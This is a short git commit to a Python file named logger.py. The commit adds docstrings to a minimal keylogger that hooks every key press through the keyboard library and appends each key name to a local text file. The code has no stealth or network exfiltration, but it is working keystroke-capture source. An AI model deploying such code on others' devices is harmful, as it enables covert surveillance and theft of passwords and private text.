09adb24adc4dcb891b2e94da8adaa578ffd16624
Shallom Ezekiel <oh.shalom.0@gmail.com>
2024-06-02 19:25:23 +0000

    add: docstrings

--- logger.py
+++ logger.py
@@ -3,8 +3,19 @@ import keyboard
 log_file = 'log_file.txt'
 
 def onKeyboardEvent(event):
+    """
+    Callback function to handle keyboard events.
+    
+    This function is called whenever a keyboard event occurs. It logs the 
+    name of the key that was pressed to a log file.
+
+    Parameters:
+    event (keyboard.KeyboardEvent): The event object containing information 
+                                    about the keyboard event.
+    """
     with open(log_file, 'a') as file:
         file.write('{}\n'.format(event.name))
 
+# Set up the keyboard event listener
 keyboard.on_press(onKeyboardEvent)
 keyboard.wait()
